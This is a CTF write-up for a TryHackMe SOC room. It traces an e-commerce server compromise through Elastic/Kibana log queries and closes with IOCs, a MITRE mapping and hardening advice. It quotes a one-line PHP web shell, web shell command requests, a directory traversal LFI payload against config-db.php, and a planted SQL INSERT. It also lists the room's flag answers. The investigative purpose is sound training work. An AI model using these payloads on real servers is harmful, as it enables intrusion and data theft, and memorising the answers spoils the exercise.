---
title: "Elastic Stack: Slingway Web Server Compromise & Data Manipulation"
description: "A digital forensics investigation using Elastic Stack to uncover an e-commerce web server compromise involving automated scanning, THC-Hydra brute-forcing, PHP webshell persistence, Local File Inclusion (LFI), database exfiltration, and rogue flag injection via phpMyAdmin."
date: 2026-06-17
platform: "TryHackMe"
difficulty: "Medium"
category: "Incident Response / SOC Analysis"
tags: ["elastic-stack", "webshell", "brute-force", "lfi", "database-exfiltration", "data-manipulation", "phpmyadmin", "modsecurity"]
featured: true
draft: false
tools: ["Elasticsearch", "Kibana", "CyberChef"]
room_url: "https://tryhackme.com/room/slingshot"

---

# Slingshot — CTF Writeup

---

## Scenario Overview

Slingway Inc., a leading toy company, detected suspicious activity on its e-commerce web server and potential unauthorized database modifications. Logs were ingested into an Elastic Stack instance for investigation. The attacker (`10.0.2.15`) executed a full kill chain: port scanning, directory brute-forcing, credential cracking, web shell upload, Local File Inclusion, and database exfiltration — all traceable through Apache logs in Kibana.

---

## Attack Chain Overview

```
[1] Reconnaissance    → Nmap Scripting Engine (port/service scan)
[2] Enumeration       → Gobuster (directory brute-force — 1867 x 404)
[3] Discovery         → /backups/ (flag), /admin-login.php
[4] Brute-Force       → THC-Hydra → admin:thx1138
[5] Persistence       → Web shell upload → easy-simple-php-webshell.php
[6] RCE               → whoami, pwd, ls, which nc
[7] LFI               → config-db.php (DB credentials)
[8] Exfiltration      → phpMyAdmin → customer_credit_cards dump
[9] Data Manipulation → INSERT flag into credit_cards table
```

---

## Question 1 — What is the attacker's IP address?

### Investigation

**Kibana Query:**

```
response.status : 200
```

Sorted by request volume per source IP — one IP dominated **84.7% of all server traffic**, generating thousands of automated requests in rapid succession. Cross-referencing the User-Agent strings confirmed all attack phases originated from the same host.

### Answer

```
10.0.2.15
```
![Answer](../images/Slingshot-1.png)

---

## Question 2 — What is the first scanner the attacker ran against the web server?

### Investigation

**Kibana Query:**

```
request.headers.User-Agent : *Nmap*
```

The earliest timestamps in the attack timeline showed automated requests carrying the **Nmap Scripting Engine (NSE)** User-Agent — a network/service scanner used to map open ports, active directories, and publicly exposed configuration files (e.g., `/.git/HEAD`).

This is the standard first phase of any structured attack: **passive and active reconnaissance** before moving to more targeted techniques.

### Answer

```
Nmap Scripting Engine
```
![Answer](../images/Slingshot-2.png)

---

## Question 3 — What is the User-Agent of the directory enumeration tool?

### Investigation

**Kibana Query:**

```
request.headers.User-Agent : *Gobuster*
```

Immediately following the Nmap scan, the attacker launched a directory brute-force campaign using **Gobuster** — a wordlist-based directory/file enumeration tool. Its User-Agent string is injected into every HTTP request it generates.

### Answer

```
Mozilla/5.0 (Gobuster)
```
![Answer](../images/Slingshot-3.png)

---

## Question 4 — How many 404 responses did the attacker receive during enumeration?

### Investigation

**Kibana Query:**

```
response.status : 404 AND request.headers.User-Agent : "Mozilla/5.0 (Gobuster)"
```

Gobuster fires requests for every entry in its wordlist — the vast majority return `404 Not Found` for non-existent paths. Only the paths that exist return `200 OK`, revealing valid directories and files.

### Answer

```
1867
```
![Answer](../images/Slingshot-4.png)

---

## Question 5 — What flag was discovered in one of the enumerated directories?

### Investigation

**Kibana Query:**

```
response.status : 200 AND request.headers.User-Agent : "Mozilla/5.0 (Gobuster)"
```

Out of 1,867 failed requests, exactly **9 paths** returned `200 OK`. One of these was the `/backups/` directory — an open directory listing that should never be publicly accessible. It exposed a flag token value stored in a backup file.

### Answer

```
a76637b62ea99acda12f5859313f539a
```
![Answer](../images/Slingshot-5.png)

---

## Question 6 — What login page did the attacker discover?

### Investigation

**Kibana Query:**

```
request.headers.User-Agent : "Mozilla/5.0 (Gobuster)" AND http.url : /*login*
```

Among the successful Gobuster hits, one path matching the `*login*` pattern returned an HTTP `401 Unauthorized` — indicating an **active authentication portal** that requires credentials. This became the next target for the brute-force phase.

### Answer

```
/admin-login.php
```
![Answer](../images/Slingshot-6.png)

---

## Question 7 — What is the User-Agent of the brute-force tool?

### Investigation

**Kibana Query:**

```
http.url : "/admin-login.php"
```

This query returned **488 distinct log records** within millisecond-interval loops — the volumetric signature of an automated online password cracker. The User-Agent string embedded in every request identified the tool as **THC-Hydra**.

### Answer

```
Mozilla/4.0 (Hydra)
```
![Answer](../images/Slingshot-7.png)

---

## Question 8 — What username:password combination was used to gain access?

### Investigation

**Kibana Query (ModSecurity audit log):**

```
http.url : "/admin-login.php" AND response.status : 200
```

At timestamp `14:29:04.732`, a POST request to `/admin-login.php` finally returned `200 OK` — breaking through the authentication wall. Inspecting the `Authorization` header in ModSecurity's audit log revealed:

```
Authorization: Basic YWRtaW46dGh4MTEzOA==
```
![Answer](../images/Slingshot-8.png)

Decoding via Base64:

```
Base64_Decode("YWRtaW46dGh4MTEzOA==") → admin:thx1138
```

The attacker exploited **default credentials** that were never changed after deployment.

### Answer

```
admin:thx1138
```
![Answer](../images/Slingshot-9.png)

---

## Question 9 — What flag was included in the uploaded web shell file?

### Investigation

**Kibana Query:**

```
http.url : /admin/upload.php* AND
request.headers.User-Agent : "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

After authenticating, the attacker switched to a real browser (Firefox) and abused the admin panel's file upload functionality at `/admin/upload.php`. The uploaded file:

```
easy-simple-php-webshell.php
```

Contained the following embedded PHP backdoor with a TryHackMe flag in a comment:

```php
// THM{ecb012e53a58818cbd17a924769ec447}
<?php system($_GET['cmd']); ?>
```

The server accepted the file without any MIME-type validation or extension filtering — returning `HTTP 200 OK`.

### Answer

```
THM{ecb012e53a58818cbd17a924769ec447}
```
![Answer](../images/Slingshot-10.png)

---

## Question 10 — What was the first command the attacker ran using the web shell?

### Investigation

**Kibana Query:**

```
"easy-simple-php-webshell.php"
```

This returned **6 consecutive RCE events** starting at `14:29:53.862`. The first GET request to the uploaded shell:

```
GET /uploads/easy-simple-php-webshell.php?cmd=whoami
```

`whoami` is the universal first command run after gaining a web shell — it confirms the OS user context under which the web server process is running (typically `www-data` for Apache on Ubuntu).

**Subsequent commands executed:**

| Command | Purpose |
|---|---|
| `whoami` | Identify current OS user |
| `pwd` | Confirm working directory |
| `ls` | List files in current directory |
| `which nc` | Check if Netcat is available for reverse shell |

### Answer

```
whoami
```
![Answer](../images/Slingshot-11.png)

---

## Question 11 — Which file was accessed via LFI to retrieve database credentials?

### Investigation

**Kibana Query:**

```
http.url: *db* AND response.status: 200
```

The attacker targeted `/admin/settings.php` with directory traversal payloads to read internal configuration files:

```
/admin/settings.php?page=../../../../../../../../etc/phpmyadmin/config-db.php
```

This **Local File Inclusion (LFI)** vulnerability allowed reading server-side PHP configuration files outside the web root — exposing plaintext database credentials.

### Answer

```
config-db.php
```
![Answer](../images/Slingshot-12.png)

---

## Question 12 — What is the name of the database the attacker exported via phpMyAdmin?

### Investigation

**Kibana Query:**

```
http.url: *export*
```

At `14:33:45.898`, the attacker authenticated to phpMyAdmin using the credentials harvested via LFI and accessed the export functionality at `/phpmyadmin/tbl_export.php`. The GET parameters confirmed the target:

```
db=customer_credit_cards&table=credit_cards
```

The attacker exfiltrated the complete `credit_cards` table — containing sensitive customer financial data.

### Answer

```
customer_credit_cards
```
![Answer](../images/Slingshot-13.png)

---

## Question 13 — What flag does the attacker insert into the database?

### Investigation

**Kibana Query:**

```
http.url: *import* AND response.status: 200
```

At `14:34:46.120`, the attacker used `/phpmyadmin/import.php` to upload and execute a SQL script. URL-decoding the POST body exposed the injected query:

```sql
INSERT INTO credit_cards (...) VALUES ('000', 'c6aa3215a7d519eeb40a660f3b76e64c', ...)
```

This confirmed **unauthorized write access** — the attacker planted a flag value directly into production database records.

### Answer

```
c6aa3215a7d519eeb40a660f3b76e64c
```
![Answer](../images/Slingshot-14.png)
![Answer](../images/Slingshot-15.png)

---

## Full Attack Timeline

| Time (UTC) | Tool | Target | Event |
|---|---|---|---|
| 14:27:08 | Nmap NSE | Multi-endpoint | Port/service/config scan |
| 14:27:43 | Gobuster | Wordlist iteration | 1,867 directory brute-force attempts |
| 14:27:43 | Gobuster | `/admin-login.php` | Admin portal discovered (401) |
| 14:27:45 | Gobuster | `/backups/` | Flag exposed (200) |
| 14:29:01 | THC-Hydra | `/admin-login.php` | 488 brute-force attempts |
| 14:29:04 | THC-Hydra | `/admin-login.php` | **Credentials cracked: admin:thx1138** |
| 14:29:35 | Firefox | `/admin/upload.php` | Web shell uploaded |
| 14:29:53 | Firefox | `/uploads/...webshell.php` | `whoami` — first RCE command |
| 14:29:57–14:30:08 | Firefox | Web shell | `pwd`, `ls`, `which nc` |
| 14:31:27 | Firefox | `/admin/settings.php` | LFI → `config-db.php` read |
| 14:33:45 | Firefox | `/phpmyadmin/tbl_export.php` | `customer_credit_cards` dumped |
| 14:34:46 | Firefox | `/phpmyadmin/import.php` | Flag injected into `credit_cards` |

---

## Indicators of Compromise (IOCs)

| Type | Value | Description |
|---|---|---|
| IP | `10.0.2.15` | Attacker source IP |
| Tool | `Nmap Scripting Engine` | Reconnaissance scanner |
| Tool | `Mozilla/5.0 (Gobuster)` | Directory enumeration |
| Tool | `Mozilla/4.0 (Hydra)` | Brute-force cracker |
| Credentials | `admin:thx1138` | Compromised admin credentials |
| Auth Token | `YWRtaW46dGh4MTEzOA==` | Base64-encoded credential |
| File | `easy-simple-php-webshell.php` | PHP web shell |
| Path | `/uploads/easy-simple-php-webshell.php` | Web shell location |
| Path | `/backups/` | Exposed directory with flag |
| File | `config-db.php` | DB credentials file (LFI target) |
| Database | `customer_credit_cards` | Exfiltrated database |
| Flag 1 | `a76637b62ea99acda12f5859313f539a` | Found in `/backups/` |
| Flag 2 | `THM{ecb012e53a58818cbd17a924769ec447}` | Inside web shell |
| Flag 3 | `c6aa3215a7d519eeb40a660f3b76e64c` | Injected into DB |

---

## Key Kibana / Lucene Queries Reference

```lucene
-- Attacker traffic volume
ip.src : "10.0.2.15"

-- Nmap scan
request.headers.User-Agent : *Nmap*

-- Gobuster 404s (enumeration)
response.status : 404 AND request.headers.User-Agent : "Mozilla/5.0 (Gobuster)"

-- Gobuster hits (successful discoveries)
response.status : 200 AND request.headers.User-Agent : "Mozilla/5.0 (Gobuster)"

-- Admin login brute-force
http.url : "/admin-login.php"

-- File upload exploitation
http.url : /admin/upload.php*

-- Web shell execution
"easy-simple-php-webshell.php"

-- LFI database config
http.url: *db* AND response.status: 200

-- DB exfiltration
http.url: *export*

-- DB injection
http.url: *import* AND response.status: 200
```

---

## MITRE ATT&CK Mapping

| Phase | Technique ID | Technique Name |
|---|---|---|
| Reconnaissance | T1595.002 | Active Scanning: Vulnerability Scanning (Nmap) |
| Discovery | T1595.003 | Active Scanning: Wordlist Scanning (Gobuster) |
| Initial Access | T1110.001 | Brute Force: Password Guessing (Hydra) |
| Initial Access | T1078.001 | Valid Accounts: Default Accounts |
| Persistence | T1505.003 | Server Software Component: Web Shell |
| Execution | T1059.004 | Unix Shell (web shell RCE) |
| Credential Access | T1552.001 | Unsecured Credentials: LFI → config-db.php |
| Exfiltration | T1041 | Exfiltration Over C2 Channel (phpMyAdmin) |
| Impact | T1565.001 | Data Manipulation: Stored Data Manipulation |

---

## Recommendations

1. **Remove default credentials** — `admin:thx1138` is a trivially guessable password. Enforce strong password policies and scan for default credentials before deploying to production.
2. **Implement account lockout** — After 5 failed login attempts, lock the account for a configurable period. 488 brute-force requests should never reach the application layer.
3. **Restrict file uploads** — Validate file type server-side (not via client `Content-Type`). Block `.php`, `.phtml`, `.phar` uploads. Store all uploads outside the web root with `noexec` permissions.
4. **Fix LFI vulnerability** — Never pass user-controlled input directly to file inclusion functions. Use a whitelist of allowed page names — never allow `../` traversal characters.
5. **Protect phpMyAdmin** — Never expose phpMyAdmin to the public internet. Restrict access via IP whitelist or VPN with MFA required.
6. **Disable directory listing** — The `/backups/` directory should never be publicly accessible. Set `Options -Indexes` in Apache configuration.
7. **WAF tuning** — ModSecurity detected the attack but did not block it. Review and enable blocking mode for SQLi, LFI, and file upload rules.

---

*Writeup produced as part of SOC Analyst training — TryHackMe: Slingshot*